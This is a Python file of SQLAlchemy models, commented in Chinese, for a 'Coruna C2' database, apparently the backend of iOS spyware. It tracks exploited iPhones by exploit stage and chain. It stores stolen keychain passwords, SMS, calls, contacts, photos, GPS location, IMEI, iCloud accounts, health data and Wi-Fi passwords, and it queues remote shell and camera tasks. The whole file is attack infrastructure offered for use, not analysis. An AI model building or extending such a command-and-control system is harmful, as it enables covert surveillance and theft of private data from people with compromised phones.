"""SQLAlchemy ORM 模型 - Coruna C2 数据库表结构"""

from datetime import datetime
from sqlalchemy import Column, Integer, String, DateTime, Text, ForeignKey, JSON, BigInteger, Boolean, Float
from sqlalchemy.orm import relationship

from database import Base


class Device(Base):
    """设备信息表"""
    __tablename__ = "devices"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), unique=True, index=True, nullable=False)
    device_model = Column(String(64), nullable=True)  # iPhone Xs Max, iPhone 15 Pro Max, etc.
    ios_version = Column(String(32), nullable=True)  # 17.0, 16.5, etc.
    ios_version_numeric = Column(Integer, nullable=True)  # 170000, 165000, etc.
    chipset = Column(String(64), nullable=True)  # A12, A13, A14, A15, A16, A17
    user_agent = Column(Text, nullable=True)
    ip_address = Column(String(64), nullable=True)
    last_seen = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    created_at = Column(DateTime, default=datetime.utcnow)
    first_exploit_at = Column(DateTime, nullable=True)
    status = Column(String(32), default="offline")  # online, offline, busy, error, exploited
    
    # Exploit 相关信息
    exploit_stage = Column(String(32), nullable=True)  # stage1, stage2, stage3, completed
    exploit_chain = Column(String(128), nullable=True)  # jacurutu->seedbell->VariantB
    runtime_type = Column(String(32), nullable=True)  # PSNMWj, RoAZdq
    has_pac = Column(Boolean, default=False)
    pac_integrity = Column(Boolean, nullable=True)
    
    # 硬件信息
    screen_resolution = Column(String(32), nullable=True)  # 2732x2048
    battery_level = Column(Integer, nullable=True)  # 0-100
    network_type = Column(String(16), nullable=True)  # WiFi, Cellular
    
    # 位置信息
    latitude = Column(Float, nullable=True)
    longitude = Column(Float, nullable=True)
    altitude = Column(Float, nullable=True)
    accuracy = Column(Float, nullable=True)
    location_updated_at = Column(DateTime, nullable=True)
    
    # 身份信息
    phone_number = Column(String(32), nullable=True)
    imei = Column(String(64), nullable=True)
    serial_number = Column(String(64), nullable=True)
    icloud_account = Column(String(128), nullable=True)
    device_name = Column(String(128), nullable=True)
    
    # 系统信息
    locale = Column(String(16), nullable=True)  # zh_CN, en_US
    timezone = Column(String(64), nullable=True)
    total_memory = Column(BigInteger, nullable=True)
    available_memory = Column(BigInteger, nullable=True)
    total_disk = Column(BigInteger, nullable=True)
    available_disk = Column(BigInteger, nullable=True)
    
    # 额外信息
    extra = Column(JSON, nullable=True)
    notes = Column(Text, nullable=True)
    
    # 统计信息
    total_tasks = Column(Integer, default=0)
    completed_tasks = Column(Integer, default=0)
    failed_tasks = Column(Integer, default=0)
    total_exfil = Column(BigInteger, default=0)  # bytes
    last_activity = Column(DateTime, nullable=True)

    # 关系
    tasks = relationship("Task", back_populates="device", cascade="all, delete-orphan")
    exfil = relationship("Exfil", back_populates="device", cascade="all, delete-orphan")
    logs = relationship("DeviceLog", back_populates="device", cascade="all, delete-orphan")
    files = relationship("FileRecord", back_populates="device", cascade="all, delete-orphan")
    contacts = relationship("ContactRecord", back_populates="device", cascade="all, delete-orphan")
    sms_messages = relationship("SMSRecord", back_populates="device", cascade="all, delete-orphan")
    calls = relationship("CallRecord", back_populates="device", cascade="all, delete-orphan")
    keychains = relationship("KeychainRecord", back_populates="device", cascade="all, delete-orphan")
    photos = relationship("PhotoRecord", back_populates="device", cascade="all, delete-orphan")
    clipboards = relationship("ClipboardRecord", back_populates="device", cascade="all, delete-orphan")
    apps = relationship("AppRecord", back_populates="device", cascade="all, delete-orphan")
    processes = relationship("ProcessRecord", back_populates="device", cascade="all, delete-orphan")
    wifi_networks = relationship("WiFiRecord", back_populates="device", cascade="all, delete-orphan")
    browser_history = relationship("BrowserHistoryRecord", back_populates="device", cascade="all, delete-orphan")
    calendar_events = relationship("CalendarEvent", back_populates="device", cascade="all, delete-orphan")
    note_records = relationship("NoteRecord", back_populates="device", cascade="all, delete-orphan")
    health_data = relationship("HealthRecord", back_populates="device", cascade="all, delete-orphan")


class Task(Base):
    """任务表"""
    __tablename__ = "tasks"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    task_type = Column(String(64), nullable=False)  # shell, upload, download, screenshot, keychain, contact, sms, camera, etc.
    payload = Column(Text, nullable=True)  # JSON or raw command
    status = Column(String(32), default="pending")  # pending, running, completed, failed, cancelled, timeout
    result = Column(Text, nullable=True)  # JSON result or error message
    error_message = Column(Text, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    started_at = Column(DateTime, nullable=True)
    completed_at = Column(DateTime, nullable=True)
    priority = Column(Integer, default=0)  # higher = first
    retry_count = Column(Integer, default=0)
    timeout_seconds = Column(Integer, default=300)
    
    # 任务元数据
    task_metadata = Column(JSON, nullable=True)
    parent_task_id = Column(Integer, ForeignKey("tasks.id"), nullable=True)
    
    device = relationship("Device", back_populates="tasks")


class Exfil(Base):
    """数据外泄表"""
    __tablename__ = "exfil"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    category = Column(String(64), nullable=False)  # credential, wifi, file, screenshot, contact, sms, call, photo, etc.
    path = Column(String(512), nullable=True)  # 远程文件路径
    description = Column(Text, nullable=True)
    file_size = Column(BigInteger, nullable=True)
    file_path = Column(String(512), nullable=True)  # 本地服务器路径
    content_preview = Column(Text, nullable=True)  # base64 preview or text
    mime_type = Column(String(128), nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    # 外泄元数据
    exfil_metadata = Column(JSON, nullable=True)
    task_id = Column(Integer, ForeignKey("tasks.id"), nullable=True)
    
    device = relationship("Device", back_populates="exfil")


class DeviceLog(Base):
    """设备日志表"""
    __tablename__ = "device_logs"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    stage = Column(String(64), nullable=False)  # stage1, stage2, stage3, exploit, task, etc.
    status = Column(String(32), nullable=False)  # success, error, info, warning
    message = Column(Text, nullable=True)
    elapsed_ms = Column(Integer, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    # 日志元数据
    log_metadata = Column(JSON, nullable=True)
    log_level = Column(String(16), default="INFO")  # DEBUG, INFO, WARNING, ERROR, CRITICAL
    
    device = relationship("Device", back_populates="logs")


class AccessLog(Base):
    """访问日志表 - 记录 group.html 被访问的情况"""
    __tablename__ = "access_logs"

    id = Column(Integer, primary_key=True, index=True)
    ip = Column(String(64), nullable=False, index=True)
    user_agent = Column(Text, nullable=True)
    referer = Column(String(1024), nullable=True)
    path = Column(String(256), nullable=False, default="/group.html")
    method = Column(String(16), nullable=False, default="POST")
    created_at = Column(DateTime, default=datetime.utcnow, index=True)


class FileRecord(Base):
    """文件记录表"""
    __tablename__ = "file_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    remote_path = Column(String(1024), nullable=False)  # 设备上的文件路径
    file_name = Column(String(512), nullable=False)
    file_size = Column(BigInteger, nullable=True)
    file_type = Column(String(128), nullable=True)
    modified_date = Column(DateTime, nullable=True)
    created_date = Column(DateTime, nullable=True)
    permissions = Column(String(32), nullable=True)
    local_path = Column(String(1024), nullable=True)  # 服务器本地路径
    download_status = Column(String(32), default="pending")  # pending, downloading, completed, failed
    download_progress = Column(Integer, default=0)  # 0-100
    created_at = Column(DateTime, default=datetime.utcnow)
    downloaded_at = Column(DateTime, nullable=True)
    
    device = relationship("Device", back_populates="files")


class ContactRecord(Base):
    """联系人记录表"""
    __tablename__ = "contact_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    display_name = Column(String(256), nullable=True)
    phone_numbers = Column(JSON, nullable=True)  # [{"label": "mobile", "number": "+8613800138000"}]
    emails = Column(JSON, nullable=True)  # [{"label": "home", "email": "user@example.com"}]
    addresses = Column(JSON, nullable=True)  # [{"label": "home", "street": "...", "city": "..."}]
    organization = Column(String(256), nullable=True)
    job_title = Column(String(256), nullable=True)
    birthday = Column(DateTime, nullable=True)
    notes = Column(Text, nullable=True)
    contact_id = Column(String(128), nullable=True)  # 系统联系人ID
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="contacts")


class SMSRecord(Base):
    """短信记录表"""
    __tablename__ = "sms_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    sender = Column(String(64), nullable=True)  # 发送者号码
    recipient = Column(String(64), nullable=True)  # 接收者号码
    body = Column(Text, nullable=True)  # 短信内容
    date_sent = Column(DateTime, nullable=True)
    date_read = Column(DateTime, nullable=True)
    message_id = Column(String(128), nullable=True)  # 系统消息ID
    is_read = Column(Boolean, default=False)
    is_sent = Column(Boolean, default=False)  # True=发送, False=接收
    attachment_count = Column(Integer, default=0)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="sms_messages")


class CallRecord(Base):
    """通话记录表"""
    __tablename__ = "call_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    phone_number = Column(String(64), nullable=True)
    call_type = Column(String(32), nullable=True)  # incoming, outgoing, missed, cancelled
    duration = Column(Integer, nullable=True)  # 秒
    date_called = Column(DateTime, nullable=True)
    contact_name = Column(String(256), nullable=True)
    location = Column(String(256), nullable=True)  # 通话地点（如果有）
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="calls")


class KeychainRecord(Base):
    """钥匙串记录表"""
    __tablename__ = "keychain_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    service = Column(String(256), nullable=True)  # 服务名称
    account = Column(String(256), nullable=True)  # 账户名
    password = Column(Text, nullable=True)  # 密码（加密存储）
    label = Column(String(256), nullable=True)
    creation_date = Column(DateTime, nullable=True)
    modification_date = Column(DateTime, nullable=True)
    access_group = Column(String(128), nullable=True)
    accessible = Column(String(64), nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="keychains")


class PhotoRecord(Base):
    """照片记录表"""
    __tablename__ = "photo_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    album_name = Column(String(256), nullable=True)
    file_path = Column(String(1024), nullable=True)  # 设备上的文件路径
    file_name = Column(String(512), nullable=True)
    file_size = Column(BigInteger, nullable=True)
    width = Column(Integer, nullable=True)
    height = Column(Integer, nullable=True)
    orientation = Column(Integer, nullable=True)  # 1-8
    date_taken = Column(DateTime, nullable=True)
    date_modified = Column(DateTime, nullable=True)
    location = Column(JSON, nullable=True)  # {"latitude": ..., "longitude": ...}
    local_path = Column(String(1024), nullable=True)  # 服务器本地路径
    thumbnail_path = Column(String(1024), nullable=True)
    is_deleted = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="photos")


class ClipboardRecord(Base):
    """剪贴板记录表"""
    __tablename__ = "clipboard_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    content = Column(Text, nullable=True)  # 剪贴板内容
    content_type = Column(String(64), nullable=True)  # text, image, url
    timestamp = Column(DateTime, default=datetime.utcnow)
    app_name = Column(String(256), nullable=True)  # 复制来源应用
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="clipboards")


class AppRecord(Base):
    """应用记录表"""
    __tablename__ = "app_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    bundle_id = Column(String(256), nullable=True)  # com.apple.mobilesafari
    app_name = Column(String(256), nullable=True)
    display_name = Column(String(256), nullable=True)
    version = Column(String(64), nullable=True)
    build_version = Column(String(64), nullable=True)
    bundle_size = Column(BigInteger, nullable=True)
    install_date = Column(DateTime, nullable=True)
    app_category = Column(String(128), nullable=True)  # Games, Productivity, etc.
    is_system_app = Column(Boolean, default=False)
    is_hidden = Column(Boolean, default=False)
    icon_path = Column(String(1024), nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="apps")


class ProcessRecord(Base):
    """进程记录表"""
    __tablename__ = "process_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    name = Column(String(256), nullable=True)  # 进程名称
    pid = Column(Integer, nullable=True)  # 进程ID
    ppid = Column(Integer, nullable=True)  # 父进程ID
    path = Column(String(1024), nullable=True)  # 可执行文件路径
    user = Column(String(64), nullable=True)
    cpu_usage = Column(Float, nullable=True)  # CPU使用率
    memory_usage = Column(BigInteger, nullable=True)  # 内存使用（字节）
    start_time = Column(DateTime, nullable=True)
    status = Column(String(32), nullable=True)  # running, sleeping, stopped, zombie
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="processes")


class WiFiRecord(Base):
    """WiFi 网络记录表"""
    __tablename__ = "wifi_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    ssid = Column(String(128), nullable=True)  # WiFi名称
    bssid = Column(String(32), nullable=True)  # MAC地址
    security_type = Column(String(32), nullable=True)  # WPA2, WPA3, Open
    password = Column(String(256), nullable=True)  # WiFi密码（加密存储）
    signal_strength = Column(Integer, nullable=True)  # 信号强度
    channel = Column(Integer, nullable=True)
    frequency = Column(Integer, nullable=True)  # MHz
    last_connected = Column(DateTime, nullable=True)
    is_saved = Column(Boolean, default=False)
    is_current = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="wifi_networks")


class BrowserHistoryRecord(Base):
    """浏览器历史记录表"""
    __tablename__ = "browser_history_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    browser_name = Column(String(64), nullable=True)  # Safari, Chrome, etc.
    url = Column(Text, nullable=True)
    title = Column(String(512), nullable=True)
    visit_count = Column(Integer, default=1)
    last_visited = Column(DateTime, nullable=True)
    first_visited = Column(DateTime, nullable=True)
    is_bookmarked = Column(Boolean, default=False)
    favicon_url = Column(String(512), nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="browser_history")


class CalendarEvent(Base):
    """日历事件表"""
    __tablename__ = "calendar_events"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    title = Column(String(512), nullable=True)
    location = Column(String(512), nullable=True)
    start_date = Column(DateTime, nullable=True)
    end_date = Column(DateTime, nullable=True)
    all_day = Column(Boolean, default=False)
    notes = Column(Text, nullable=True)
    attendees = Column(JSON, nullable=True)  # [{"name": "...", "email": "..."}]
    recurrence = Column(String(64), nullable=True)  # daily, weekly, monthly, yearly
    reminder_minutes = Column(Integer, nullable=True)
    calendar_name = Column(String(256), nullable=True)
    event_id = Column(String(128), nullable=True)  # 系统事件ID
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="calendar_events")


class NoteRecord(Base):
    """笔记记录表"""
    __tablename__ = "note_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    title = Column(String(512), nullable=True)
    content = Column(Text, nullable=True)
    folder = Column(String(256), nullable=True)
    created_date = Column(DateTime, nullable=True)
    modified_date = Column(DateTime, nullable=True)
    is_locked = Column(Boolean, default=False)
    note_id = Column(String(128), nullable=True)  # 系统笔记ID
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="note_records")


class HealthRecord(Base):
    """健康数据表"""
    __tablename__ = "health_records"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    data_type = Column(String(64), nullable=True)  # steps, heart_rate, sleep, etc.
    value = Column(Float, nullable=True)
    unit = Column(String(32), nullable=True)  # count, bpm, hours, etc.
    start_date = Column(DateTime, nullable=True)
    end_date = Column(DateTime, nullable=True)
    source = Column(String(256), nullable=True)  # 数据来源（设备、应用）
    health_metadata = Column(JSON, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    device = relationship("Device", back_populates="health_data")


class SystemMetric(Base):
    """系统指标表"""
    __tablename__ = "system_metrics"

    id = Column(Integer, primary_key=True, index=True)
    metric_name = Column(String(64), nullable=False, index=True)  # cpu_usage, memory_usage, disk_usage, etc.
    metric_value = Column(Float, nullable=False)
    metric_unit = Column(String(32), nullable=True)  # %, MB, GB, etc.
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    metric_metadata = Column(JSON, nullable=True)


class CollectedData(Base):
    """数据收集表 - data_collector 模块上报的通用数据"""
    __tablename__ = "collected_data"

    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(64), ForeignKey("devices.device_uuid"), nullable=False, index=True)
    category = Column(String(64), nullable=False, index=True)  # device_info, keychain, wifi, browser, filesystem, etc.
    data_key = Column(String(128), nullable=True)  # 可选的键名，用于去重/索引
    payload = Column(JSON, nullable=False)  # JSON 数据包
    source = Column(String(32), nullable=True)  # "js_fallback" | "dylib" | "native_bridge"
    collected_at = Column(DateTime, nullable=True)  # 设备端采集时间
    created_at = Column(DateTime, default=datetime.utcnow)

    device = relationship("Device", backref="collected_data")